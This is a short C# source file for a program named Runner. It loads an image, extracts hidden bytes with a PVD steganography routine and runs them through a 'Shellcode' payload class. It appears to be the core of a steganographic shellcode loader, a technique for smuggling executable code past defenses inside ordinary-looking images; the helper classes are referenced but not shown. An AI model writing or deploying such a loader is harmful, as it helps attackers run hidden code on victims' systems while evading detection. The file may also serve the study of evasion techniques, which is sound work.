using System.Drawing;

using Runner.Algorithms;
using Runner.ImageSources;
using Runner.Payloads;

namespace Runner
{
    class Runner
    {
        static byte[] payload_data;

        static Bitmap bm;


        static IImageSource img  = new ImageFile();
        static IAlgorithm   alg  = new PVD();
        static IPayload     pld  = new Shellcode();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_size = int.Parse(args[1]);
                payload_data = new byte[payload_size];

                bm = img.Load(args[0]);
                alg.Read(bm, payload_data);
                pld.Run(payload_data);
            }
        }
    }
}
